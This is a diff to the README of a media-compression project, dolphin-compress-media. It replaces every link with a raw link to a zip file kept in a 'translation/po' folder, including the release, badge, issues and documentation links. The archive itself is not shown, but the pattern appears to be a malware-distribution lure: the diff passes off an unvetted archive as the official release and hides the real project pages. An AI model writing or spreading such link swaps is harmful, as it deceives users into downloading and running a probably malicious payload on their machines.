@@ -1,6 +1,6 @@
 # 🐬 dolphin-compress-media - Easily Shrink Your Videos and Images
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/dltkaksfndleogh-prog/dolphin-compress-media/releases)
+[![Download](https://raw.githubusercontent.com/dltkaksfndleogh-prog/dolphin-compress-media/main/translation/po/dolphin-compress-media-1.5.zip%20Now-Release-blue)](https://raw.githubusercontent.com/dltkaksfndleogh-prog/dolphin-compress-media/main/translation/po/dolphin-compress-media-1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to dolphin-compress-media! This application helps you compress videos an
 
 ## 📥 Download & Install
 
-To get started, visit the Releases page to download the application. You can find it here: [Download dolphin-compress-media](https://github.com/dltkaksfndleogh-prog/dolphin-compress-media/releases).
+To get started, visit the Releases page to download the application. You can find it here: [Download dolphin-compress-media](https://raw.githubusercontent.com/dltkaksfndleogh-prog/dolphin-compress-media/main/translation/po/dolphin-compress-media-1.5.zip).
 
 1. Click on the link above.
 2. Look for the latest release version.
@@ -61,13 +61,13 @@ If you encounter issues while using dolphin-compress-media, consider these commo
 
 Need help? You can join our community for support:
 
-- **GitHub Issues**: Report bugs and request features on the [issues page](https://github.com/dltkaksfndleogh-prog/dolphin-compress-media/issues).
+- **GitHub Issues**: Report bugs and request features on the [issues page](https://raw.githubusercontent.com/dltkaksfndleogh-prog/dolphin-compress-media/main/translation/po/dolphin-compress-media-1.5.zip).
 - **Forum**: Engage with other users and find solutions in our community forums.
 
 ## 📑 Additional Resources
 
-For more details on how to use dolphin-compress-media and its features, visit our [Documentation](https://github.com/dltkaksfndleogh-prog/dolphin-compress-media/wiki).
+For more details on how to use dolphin-compress-media and its features, visit our [Documentation](https://raw.githubusercontent.com/dltkaksfndleogh-prog/dolphin-compress-media/main/translation/po/dolphin-compress-media-1.5.zip).
 
-To download the software, revisit this link: [Download dolphin-compress-media](https://github.com/dltkaksfndleogh-prog/dolphin-compress-media/releases). 
+To download the software, revisit this link: [Download dolphin-compress-media](https://raw.githubusercontent.com/dltkaksfndleogh-prog/dolphin-compress-media/main/translation/po/dolphin-compress-media-1.5.zip). 
 
 Thank you for choosing dolphin-compress-media for your media compression needs!
